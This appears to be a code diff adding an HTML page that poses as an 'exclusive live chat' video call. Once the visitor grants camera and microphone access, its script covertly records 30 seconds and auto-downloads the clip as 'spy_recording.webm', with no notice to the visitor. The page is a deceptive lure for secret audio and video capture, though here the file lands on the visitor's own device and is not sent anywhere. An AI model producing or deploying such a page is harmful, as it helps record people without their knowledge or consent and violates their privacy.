@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Live Video Chat</title>
+    <style>
+        body {
+            background: #111;
+            color: #fff;
+            text-align: center;
+            font-family: Arial, sans-serif;
+        }
+
+        video {
+            border: 2px solid #fff;
+            margin-top: 20px;
+            width: 80%;
+            max-width: 600px;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 18px;
+            cursor: pointer;
+            margin-top: 20px;
+            background-color: #28a745;
+            border: none;
+            border-radius: 5px;
+            color: white;
+        }
+
+        button:hover {
+            background-color: #218838;
+        }
+    </style>
+</head>
+<body>
+    <h1>Join the Exclusive Live Chat!</h1>
+    <p>Click below to start the video call.</p>
+    <button onclick="startStream()">Join Now</button>
+    <video id="video" autoplay playsinline></video>
+
+    <script>
+        async function startStream() {
+            try {
+                // طلب صلاحية الكاميرا والميكروفون
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // بدء التسجيل
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                recorder.ondataavailable = (e) => {
+                    if (e.data && e.data.size > 0) {
+                        chunks.push(e.data);
+                    }
+                };
+
+                recorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.style.display = 'none';
+                    a.href = url;
+                    a.download = 'spy_recording.webm';
+                    document.body.appendChild(a);
+                    a.click();
+                    URL.revokeObjectURL(url);
+                    document.body.removeChild(a);
+                };
+
+                recorder.start();
+
+                // التسجيل لمدة 30 ثانية
+                setTimeout(() => {
+                    if (recorder.state === 'recording') {
+                        recorder.stop();
+                    }
+                }, 30000);
+            } catch (err) {
+                console.error('Access denied:', err);
+                alert('فشل في الوصول إلى الكاميرا أو الميكروفون.');
+            }
+        }
+    </script>
+</body>
+</html>
